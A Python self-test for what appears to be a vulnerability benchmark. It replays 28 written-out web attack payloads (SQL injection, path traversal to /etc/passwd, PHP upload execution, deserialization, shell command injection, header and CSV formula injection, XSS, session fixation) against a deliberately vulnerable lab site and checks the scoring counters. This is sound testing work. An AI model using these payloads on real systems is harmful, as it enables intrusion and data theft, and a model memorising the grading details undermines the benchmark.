#!/usr/bin/env python3
"""Replay every catalog PoC for the trade site and assert each counter fires exactly once.

This is what stops the corpus from being decorative. An entry that claims a flaw but
whose own PoC no longer reaches it is worse than no entry at all: every tool silently
loses a point it could never have won, and "nobody found it" becomes indistinguishable
from "it is hard".

Method
------
Each PoC is replayed inside a window. Before it runs, the export cursor is noted; after
it runs, only the events past that cursor are counted. Windowing rather than totalling
matters here because several of this target's counters are properties of an ordinary
response -- a session cookie being issued, a page being rendered with a third-party
script on it -- and those legitimately move during other PoCs too. What has to be true
is that each PoC moves ITS OWN counter exactly once. Two is the interesting failure: it
usually means a sink is counting the payload rather than the effect, which would hand
tools free points.

Every signal is also checked for a peer address. A signal that arrives without one
cannot be classified as ours, which means the platform's own replay would be scored as
somebody's exploitation -- so an empty peer is a failure here even when the count is
right.

Identification of this traffic as the platform's own is BY SOURCE ADDRESS. Run it from
the estate network, whose range the target carries in TELEMETRY_SYNTHETIC_CIDRS. There
is no marker header anywhere below, and there must never be one: a header named after
the harness would be visible to a tool through any reflection or header flaw on this
target -- and this target has both -- and would hand it the shape of the grader.

The target must be freshly reset before this runs, and reset again afterwards, because
several PoCs leave a row or a file behind on purpose:

    docker compose exec legacy-web /usr/local/bin/state-reset
    ... run this ...
    docker compose exec legacy-web /usr/local/bin/state-reset

Usage
-----
    python3 targets/legacy/selftest.py                 # replay + assertions
    python3 targets/legacy/selftest.py --no-collector  # replay only

Run it from the estate network, e.g.

    docker run --rm --network bench-internal -v "$PWD:/w" -w /w python:3.12-alpine \\
        python targets/legacy/selftest.py

Environment
-----------
    LEGACY_HOST          default web01
    LEGACY_PORT          default 80
    LEGACY_SITE_DOMAIN   default braithwaite-tool.net
    TELEMETRY_ENDPOINT   default http://otel-collector:8900
"""

from __future__ import annotations

import base64
import http.cookiejar
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

HOST = os.environ.get("LEGACY_HOST", "web01")
PORT = int(os.environ.get("LEGACY_PORT", "80"))
DOMAIN = os.environ.get("LEGACY_SITE_DOMAIN", "braithwaite-tool.net")
VHOST = "www." + DOMAIN
BASE = f"http://{HOST}:{PORT}" if PORT != 80 else f"http://{HOST}"
ENDPOINT = os.environ.get("TELEMETRY_ENDPOINT", "http://otel-collector:8900").rstrip("/")

CATALOG = Path(__file__).resolve().parents[2] / "catalog" / "vulns"

USER = ("j.hartley@fenwick-joinery.example", "bramble-cutting-7231")
OTHER = ("m.novak@ridgeway-groundworks.example", "granite-lintel-9840")
STAFF = (f"s.pardoe@{DOMAIN}", "Kingsway-Depot!14")

RUN_TAG = format(int(time.time()) % 100000, "05d")

# A restore that brings back a spooler rather than the preferences record. The path is
# empty, so the gadget runs and writes nothing: the counter is about the lifecycle method
# having run on supplied data, not about the file.
SPOOLER = base64.b64encode(
    b'O:15:"DocumentSpooler":2:{s:4:"path";s:0:"";s:6:"buffer";s:0:"";}'
).decode()

# A panel body that comes from a stream rather than from the panel folder. The estate
# network has no route out, so a stream that has to be fetched would never open; this one
# carries its own body and proves the same thing.
PANEL = base64.b64encode(b"<?php echo 'panel'; ?>").decode()


# ---------------------------------------------------------------------------
# catalog: id <-> signal
# ---------------------------------------------------------------------------

def load_signals() -> dict[str, str]:
    """Map catalog id -> oracle.signal, without needing a YAML parser.

    The self-test asserts on signals because that is all a compliant target emits; the
    catalog is the only place the mapping back to an id exists.
    """
    out: dict[str, str] = {}
    for path in sorted(CATALOG.glob("BENCH-LEGY-*.yaml")):
        text = path.read_text()
        vid = re.search(r"^id:\s*(\S+)", text, re.M)
        sig = re.search(r"^\s*signal:\s*(\S+)", text, re.M)
        if vid and sig:
            out[vid.group(1)] = sig.group(1).strip("\"'")
    return out


# ---------------------------------------------------------------------------
# HTTP
# ---------------------------------------------------------------------------

class Client:
    """One identity: its own cookie jar, its own opener, nothing shared."""

    def __init__(self) -> None:
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar),
            NoRedirect(),
        )

    def get(self, target: str, headers: dict[str, str] | None = None) -> tuple[int, bytes]:
        return self._send("GET", target, None, None, headers)

    def post(self, target: str, fields: dict[str, str], headers: dict[str, str] | None = None) -> tuple[int, bytes]:
        body = urllib.parse.urlencode(fields).encode()
        return self._send("POST", target, body, "application/x-www-form-urlencoded", headers)

    def post_raw(self, target: str, body: bytes, content_type: str) -> tuple[int, bytes]:
        return self._send("POST", target, body, content_type, None)

    def _send(self, method, target, body, content_type, headers):
        request = urllib.request.Request(BASE + target, data=body, method=method)
        request.add_header("Host", VHOST)
        # An ordinary browser string. Nothing in this traffic says what is sending it.
        request.add_header(
            "User-Agent",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36",
        )
        if content_type:
            request.add_header("Content-Type", content_type)
        for name, value in (headers or {}).items():
            request.add_header(name, value)
        try:
            with self.opener.open(request, timeout=20) as response:
                return response.status, response.read()
        except urllib.error.HTTPError as error:
            return error.code, error.read()
        except OSError as error:
            print(f"    ! {method} {target}: {error}", file=sys.stderr)
            return 0, b""

    def sign_in(self, credentials: tuple[str, str]) -> bool:
        email, password = credentials
        status, _ = self.post("/account/login.php", {"email": email, "password": password})
        return status in (200, 302)


class NoRedirect(urllib.request.HTTPRedirectHandler):
    """Follow nothing.

    Each PoC is one request, or a named pair of them, and a redirect that was followed
    silently would put an extra request inside somebody's window.
    """

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def raw_query(path: str, query: str) -> str:
    """A target with a query string that is passed through exactly as written.

    urlencode would re-encode the reserved characters several of these PoCs depend on,
    and the point of most of them is what the server does with the bytes as sent.
    """
    return f"{path}?{query}"


def q(value: str) -> str:
    return urllib.parse.quote(value, safe="")


# ---------------------------------------------------------------------------
# identities, established before the first window opens
# ---------------------------------------------------------------------------

anon = Client()
user = Client()
other = Client()
staff = Client()


def fresh() -> Client:
    return Client()


# ---------------------------------------------------------------------------
# the PoCs
# ---------------------------------------------------------------------------

def poc_0001() -> None:
    """Blind boolean injection in the reference lookup."""
    anon.get(raw_query("/product.php", "ref=" + q("BT-4471' OR '1'='1")))


def poc_0002() -> None:
    """The same, in a numeric position, where no quote is needed to leave the literal."""
    anon.get(raw_query("/branch.php", "id=" + q("4 OR 1=1")))


def poc_0003() -> None:
    """The order history filter, past the customer restriction that follows it."""
    user.get(raw_query("/account/orders.php", "ref=" + q("%' OR '1'='1'#")))


def poc_0004() -> None:
    """A help article that resolves outside the article folder."""
    anon.get(raw_query("/help.php", "topic=" + q("../../../../etc/passwd")))


def poc_0005() -> None:
    """The masthead fragment, named in a cookie nothing links to."""
    client = fresh()
    client.get("/", headers={"Cookie": "bt_skin=../../../../etc/passwd"})


def poc_0006() -> None:
    """A console panel whose body came from a stream rather than the panel folder."""
    staff.get(raw_query("/admin/widget.php", "source=" + q(f"data://text/plain;base64,{PANEL}")))


def poc_0007() -> None:
    """A document served from outside the literature folder."""
    anon.get(raw_query("/download.php", "doc=" + q("../../../../etc/passwd")))


def poc_0008() -> None:
    """The same, past the single pass that removes the sequence once."""
    user.get(raw_query("/account/invoice.php", "file=" + q("....//....//....//....//etc/passwd")))


def poc_0009() -> None:
    """An attachment that keeps its extension, and is then handed to the interpreter."""
    name = f"note-{RUN_TAG}.php"
    boundary = "----------------------------7d94b2c1f0"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="attachment"; filename="{name}"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
        "<?php echo 'note'; ?>\r\n"
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="note"\r\n\r\n'
        "Signed at the gate.\r\n"
        f"--{boundary}--\r\n"
    ).encode()
    user.post_raw("/account/documents.php", body, f"multipart/form-data; boundary={boundary}")
    # The counter is in the interpreter's own bootstrap and moves when the file RUNS,
    # not when it is stored, so the fetch is what this PoC is really about.
    anon.get(f"/uploads/{name}")


def poc_0010() -> None:
    """A preferences cookie that restores something other than the preferences record."""
    client = fresh()
    client.get("/", headers={"Cookie": "bt_prefs=" + SPOOLER})


def poc_0011() -> None:
    """The same, in the basket that travels in the form."""
    anon.post("/cart.php", {"basket": SPOOLER, "action": "branch", "branch": "Elland"})


def poc_0012() -> None:
    """The storage report, where the two panes disagree."""
    staff.post("/admin/tools.php", {"folder": "pod; id"})


def poc_0013() -> None:
    """The attachment check, which shells out the same way."""
    user.get(raw_query("/account/documents.php", "preview=" + q("note.txt;id")))


def poc_0014() -> None:
    """A second header field carried into the response header block."""
    anon.get(raw_query("/go.php", "to=catalogue&ref=" + q("BT-4471\r\nX-Cache-Note: split")))


def poc_0015() -> None:
    """A second routing field carried into the queued message."""
    anon.post("/contact.php", {
        "name": "R. Ackroyd",
        "company": "Ackroyd Contracts",
        "email": "a.ackroyd@ackroyd-contracts.example\nBcc: ops@partner-cdn.test",
        "phone": "01422 000999",
        "message": "Please price a pallet of M12 studding.",
    })


def poc_0016() -> None:
    """A stored quotation reference that comes out of the export as a calculation."""
    user.post("/account/quote.php", {
        "reference": "=cmd|' /C calc'!A0",
        "note": "Schedule attached.",
    })
    user.get("/account/orders.php?export=csv")


def poc_0017() -> None:
    """The same, from an anonymous enquiry into a staff export."""
    anon.post("/contact.php", {
        "name": "T. Uttley",
        "company": '=HYPERLINK("http://partner-cdn.test/x","x")',
        "email": "t.uttley@uttley-steelwork.example",
        "phone": "01924 000888",
        "message": "Do you hold A4 studding in M16?",
    })
    staff.get("/admin/enquiries.php?export=csv")


def poc_0018() -> None:
    """A search term that leaves text content and opens an element."""
    anon.get(raw_query("/search.php", "q=" + q("<svg onload=alert(1)>")))


def poc_0019() -> None:
    """The sign-in banner, which was written to allow markup."""
    anon.get(raw_query("/account/login.php", "notice=" + q("<img src=x onerror=alert(1)>")))


def poc_0020() -> None:
    """A reference that closes the attribute it was written back into."""
    anon.get(raw_query("/stock.php", "ref=" + q('x" onmouseover=alert(1) x="')))


def poc_0021() -> None:
    """The machine-readable profile, which still carries the stored digest."""
    user.get("/account/profile.php?format=xml")


def poc_0022() -> None:
    """The keep-me-signed-in cookie, which carries the credential it re-authenticates with."""
    client = fresh()
    client.post("/account/login.php", {
        "email": USER[0],
        "password": USER[1],
        "remember": "1",
    })


def poc_0023() -> None:
    """The session cookie, as it is issued."""
    client = fresh()
    client.post("/account/login.php", {"email": OTHER[0], "password": OTHER[1]})


def poc_0024() -> None:
    """A sign-in against an address that has no account."""
    client = fresh()
    client.post("/account/login.php", {
        "email": f"nobody-{RUN_TAG}@example.invalid",
        "password": "whatever",
    })


def poc_0025() -> None:
    """The same question asked of the reset form."""
    client = fresh()
    client.post("/account/reset.php", {"email": f"nobody-{RUN_TAG}@example.invalid"})


def poc_0026() -> None:
    """A sign-in bound to an identifier this deployment never issued."""
    client = fresh()
    chosen = ("a1" * 16)[:32]
    client.post(
        "/account/login.php",
        {"email": OTHER[0], "password": OTHER[1]},
        headers={"Cookie": f"BTSESSID={chosen}"},
    )


def poc_0027() -> None:
    """The quotation page, with the partner's script on it and no integrity attribute."""
    anon.get("/quote.php")


def poc_0028() -> None:
    """A report template that resolves outside the report folder."""
    staff.post("/admin/reports.php", {"template": "../../../../etc/passwd", "period": "2026-01"})


POCS = [
    ("BENCH-LEGY-0001", poc_0001), ("BENCH-LEGY-0002", poc_0002), ("BENCH-LEGY-0003", poc_0003),
    ("BENCH-LEGY-0004", poc_0004), ("BENCH-LEGY-0005", poc_0005), ("BENCH-LEGY-0006", poc_0006),
    ("BENCH-LEGY-0007", poc_0007), ("BENCH-LEGY-0008", poc_0008), ("BENCH-LEGY-0009", poc_0009),
    ("BENCH-LEGY-0010", poc_0010), ("BENCH-LEGY-0011", poc_0011), ("BENCH-LEGY-0012", poc_0012),
    ("BENCH-LEGY-0013", poc_0013), ("BENCH-LEGY-0014", poc_0014), ("BENCH-LEGY-0015", poc_0015),
    ("BENCH-LEGY-0016", poc_0016), ("BENCH-LEGY-0017", poc_0017), ("BENCH-LEGY-0018", poc_0018),
    ("BENCH-LEGY-0019", poc_0019), ("BENCH-LEGY-0020", poc_0020), ("BENCH-LEGY-0021", poc_0021),
    ("BENCH-LEGY-0022", poc_0022), ("BENCH-LEGY-0023", poc_0023), ("BENCH-LEGY-0024", poc_0024),
    ("BENCH-LEGY-0025", poc_0025), ("BENCH-LEGY-0026", poc_0026), ("BENCH-LEGY-0027", poc_0027),
    ("BENCH-LEGY-0028", poc_0028),
]


# ---------------------------------------------------------------------------
# platform API
# ---------------------------------------------------------------------------

def api(method: str, path: str, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    request = urllib.request.Request(
        ENDPOINT + path, data=data, method=method, headers={"Content-Type": "application/json"}
    )
    with urllib.request.urlopen(request, timeout=15) as response:
        payload = response.read()
    return json.loads(payload) if payload else None


def collect(run_id: str, cursor: int, wanted: str, settle: float = 1.6, timeout: float = 14.0):
    """Everything past `cursor`, waited for until `wanted` has been quiet for `settle`.

    Records reach the collector through a spool that a separate process drains, so an
    assertion taken the instant a request returns would be measuring the drain interval
    rather than the target. Waiting on the counter and then continuing to watch it is
    also what makes a SECOND firing detectable: stopping at the first would turn every
    "fires twice" into a pass.
    """
    events: list[dict] = []
    last = cursor
    first_seen: float | None = None
    deadline = time.time() + timeout
    while time.time() < deadline:
        page = api("GET", f"/v1/runs/{run_id}/events?type=signal&after_seq={last}&limit=5000")
        batch = page.get("events", []) if isinstance(page, dict) else []
        if batch:
            events.extend(batch)
            next_seq = page.get("next_seq")
            if isinstance(next_seq, int):
                last = next_seq
            if first_seen is None and any(e.get("signal") == wanted for e in events):
                first_seen = time.time()
        if first_seen is not None and time.time() - first_seen >= settle:
            break
        time.sleep(0.25)
    return events, last


def main() -> int:
    signals = load_signals()
    missing = [vid for vid, _ in POCS if vid not in signals]
    if missing:
        print(f"catalog entries without a signal: {', '.join(missing)}", file=sys.stderr)
        return 2
    known = {sig: vid for vid, sig in signals.items()}

    use_api = "--no-collector" not in sys.argv
    run_id = None
    if use_api:
        try:
            run = api("POST", "/v1/runs", {
                "tool": "selftest",
                "profile": "legacy-poc-replay",
                "targets": ["legacy"],
                "notes": "targets/legacy/selftest.py",
                "force": True,
            })
            run_id = run["run_id"]
            print(f"run {run_id}")
        except (urllib.error.URLError, OSError) as error:
            print(f"cannot reach the platform API at {ENDPOINT}: {error}", file=sys.stderr)
            print("re-run with --no-collector to replay without assertions", file=sys.stderr)
            return 2

    # The identities are established before the first window opens, so that the counters
    # an ordinary sign-in legitimately moves do not land inside somebody else's window.
    for client, credentials, label in ((user, USER, "customer"), (other, OTHER, "second customer"), (staff, STAFF, "staff")):
        if not client.sign_in(credentials):
            print(f"  ! could not sign in as the {label}; the PoCs behind it cannot fire", file=sys.stderr)
    anon.get("/")
    if use_api:
        time.sleep(2.0)

    results: dict[str, dict] = {}
    cursor = 0
    if use_api:
        page = api("GET", f"/v1/runs/{run_id}/events?type=signal&limit=5000")
        next_seq = page.get("next_seq") if isinstance(page, dict) else None
        cursor = next_seq if isinstance(next_seq, int) else 0

    for vuln_id, run_poc in POCS:
        wanted = signals[vuln_id]
        print(f"  replaying {vuln_id} ({wanted}) ... ", end="", flush=True)
        try:
            run_poc()
            print("sent")
        except OSError as error:
            print(f"FAILED to send: {error}")
        if not use_api:
            continue

        window, cursor = collect(run_id, cursor, wanted)
        mine = [e for e in window if e.get("signal") == wanted]
        results[vuln_id] = {
            "count": len(mine),
            "peers": [e.get("peer_ip") or "" for e in mine],
            "synthetic": [bool(e.get("synthetic")) for e in mine],
            "detail": ((mine[0].get("attributes") or mine[0].get("evidence") or {}).get("detail", "") if mine else ""),
            "others": sorted({str(e.get("signal")) for e in window if e.get("signal") != wanted}),
        }

    if not use_api:
        print("replay done (no assertions)")
        return 0

    api("POST", f"/v1/runs/{run_id}/close")

    print()
    failures: list[str] = []
    for vuln_id, _ in POCS:
        result = results.get(vuln_id, {"count": 0, "peers": [], "synthetic": [], "detail": "", "others": []})
        count = result["count"]
        no_peer = [p for p in result["peers"] if p == ""]
        not_ours = [s for s in result["synthetic"] if not s]

        ok = count == 1 and not no_peer and not not_ours
        print(f"{'ok  ' if ok else 'FAIL'} {vuln_id}  {signals[vuln_id]}  count={count}")
        if result["detail"]:
            print(f"       {result['detail'][:300]}")
        if count != 1:
            failures.append(f"{vuln_id}: fired {count} time(s)")
        if no_peer:
            print("       ! a signal arrived with no peer address; it cannot be classified as ours")
            failures.append(f"{vuln_id}: signal without a peer address")
        if not_ours:
            print("       ! a signal was not classified as generated traffic; run this from the estate network")
            failures.append(f"{vuln_id}: signal not classified as generated traffic")

    unexpected = sorted({s for r in results.values() for s in r["others"]} - set(known))
    for signal_name in unexpected:
        print(f"FAIL unexpected counter {signal_name} -- another target reporting into this run?")
        failures.append(f"unexpected counter {signal_name}")

    print()
    if failures:
        print(f"{len(failures)} problem(s) across {len(POCS)} entries:")
        for line in failures:
            print(f"  - {line}")
        print()
        print("count 0: the sink is not planted, or the PoC no longer reaches it, or the record")
        print("         did not reach the collector before the window closed.")
        print("count >1: something is counting the payload rather than the effect, which would")
        print("         hand tools free points.")
        return 1

    print(f"all {len(POCS)} counters fired exactly once, each with a peer address")
    print("run /usr/local/bin/state-reset in the container now: several PoCs left a row or a file behind")
    return 0


if __name__ == "__main__":
    sys.exit(main())
